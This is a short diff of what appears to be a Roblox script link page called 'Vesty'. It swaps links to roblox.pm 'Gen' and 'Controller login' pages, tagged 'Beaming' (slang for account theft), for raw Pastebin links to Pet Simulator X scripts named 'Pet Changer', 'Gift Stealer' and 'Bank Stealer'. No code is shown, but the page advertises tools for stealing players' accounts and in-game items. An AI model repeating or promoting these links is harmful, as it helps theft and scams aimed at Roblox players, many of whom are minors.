@@ -1,13 +1,8 @@
-Vesty X ULTRA ! SCROLL DOWN TO SEE ALL THE LINKS ! UPDATED!
+Vesty Scripts | Pastebin
 
-## roblox.pm (OP, OFFICIAL, UP) 🟢
-[Click to go to Gen](https://roblox.pm/creates/Vesty-Beaming3/)
+## Pet Simulator X - Script 🟢
+[Pet Changer](https://pastebin.com/raw/wYDa3VL8)
 
-[Click to go to Controller](https://roblox.pm/controller/login)
+[Gift Stealer](https://pastebin.com/raw/4vXqBhxY)
 
-[Click To Go Discover](https://roblox.pm/discovery#/)
-
-## Tutorial and Discord Server
-[Join Discord Server](https://discord.gg/JryHp9AMrf) 🟢
-
-[PSX Bank Stealer](https://www.youtube.com/watch?v=iz9zJCVj-Oo&t=1s) 🟢
+[Bank Stealer](https://pastebin.com/raw/RYGMXmi7)
